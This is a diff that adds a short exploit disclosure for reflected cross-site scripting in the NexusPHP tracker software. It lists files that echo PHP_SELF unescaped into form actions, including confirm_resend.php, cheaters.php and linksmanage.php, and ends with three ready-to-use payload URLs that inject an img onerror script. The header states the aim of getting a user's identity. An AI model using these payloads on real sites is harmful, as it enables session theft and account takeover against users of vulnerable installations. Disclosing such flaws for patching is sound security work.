@@ -1,0 +1,21 @@
+# Powered by Loid @ Shepi Team
+
+'''
+	Send URL to the web User to complete the attack,get the User's identity
+	Source: Almost all code with `PHP_SELF`, 
+          (Only Hige privilege)php file cheaters.php's line 27            echo '<center><form method="get" action="'.$_SERVER["PHP_SELF"].'">';
+          (All privilege)confirm_resend.php's line 102         <form method="get" action="<?php echo $_SERVER['PHP_SELF'] ?>">
+          (Only Hige privilege)linksmanage.php        <form method=post action="<?php echo $_SERVER["PHP_SELF"];?>">
+          And so on.
+          [!!!]Almost all code with `PHP_SELF` has XSS.
+                                      
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+	http://localhost/confirm_resend.php/"><img src=0 onerror=alert(0)>      All privilege Users
+http://localhost/cheaters.php/"><img src=0 onerror=alert(0)>        Only high privilege User
+http://localhost/linksmanage.php/"><img src=0 onerror=alert(0)>       Only high privilege User
